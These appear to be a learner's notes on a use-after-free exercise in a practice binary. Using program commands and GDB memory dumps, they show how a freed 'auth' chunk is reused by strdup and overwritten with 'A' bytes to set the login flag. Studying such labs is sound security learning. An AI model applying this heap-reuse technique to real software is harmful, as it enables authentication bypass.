line buffer address = 0x00007fffffffdd40

name buffer = 0x0000000000405ac0

steps:

└─$ ./program 
[ auth = (nil), service = (nil) ]
auth test
[ auth = 0x405ac0, service = (nil) ]
reset
[ auth = 0x405ac0, service = (nil) ]
service AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
[ auth = 0x405ac0, service = 0x405ac0 ]
login 
You have logged in already!
[ auth = 0x405ac0, service = 0x405ac0 ]

before any malloc calls:

gef➤  x/20x 0x0000000000405ac0-0x10
0x405ab0:       0x00000000      0x00000000      0x00020551      0x00000000
0x405ac0:       0x00000000      0x00000000      0x00000000      0x00000000
0x405ad0:       0x00000000      0x00000000      0x00000000      0x00000000
0x405ae0:       0x00000000      0x00000000      0x00000000      0x00000000
0x405af0:       0x00000000      0x00000000      0x00000000      0x00000000

auth stored in memeory using mlloc

gef➤  x/20x 0x0000000000405ac0-0x10
0x405ab0:       0x00000000      0x00000000      0x00000031      0x00000000
0x405ac0:       0x74736574      0x0000000a      0x00000000      0x00000000
0x405ad0:       0x00000000      0x00000000      0x00000000      0x00000000
0x405ae0:       0x00000000      0x00000000      0x00020521      0x00000000
0x405af0:       0x00000000      0x00000000      0x00000000      0x00000000

we use malloc(sizeof(auth));

auth is a sturct 

struct auth {
  char name[32];
  int auth;
};

thus it takes 36 bytes + nextblock size + pdding = 48 bytes

we have inital size 31, where 30 is the size (48bytes) of the block and 1 is set to show that this block is allocated

starting after (not including this 31)0x00000031 to including 0x00020521 total 48 bytes are located

free is calledon 0x0000000000405ac0

thus this memory is no longer allocated

send

service AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

because we are trying to allocate a memory that is with the limit of previouslly allocated block that is 32 bytes, strdup internally used malloc, thus it reuses that same 0x0000000000405ac0 block and we write 32 bytes there,

now if we call login

gef➤  x/20x 0x0000000000405ac0-0x10
0x405ab0:       0x00000000      0x00000000      0x00000031      0x00000000
0x405ac0:       0x41414120      0x41414141      0x41414141      0x41414141
0x405ad0:       0x41414141      0x41414141      0x41414141      0x41414141
0x405ae0:       0x00000a41      0x00000000      0x00020521      0x00000000
0x405af0:       0x00000000      0x00000000      0x00000000      0x00000000
gef➤  print auth
$1 = (struct auth *) 0x405ac0

auth is freed, but the struct still points to freed location, where we have 32 bytes, thus, we have write 1 byte after the buffer which is the unintialized int location.

service AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAB

gef➤  x/33bx $rax
0x405ac0:       0x20    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0x405ac8:       0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0x405ad0:       0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0x405ad8:       0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0x405ae0:       0x42


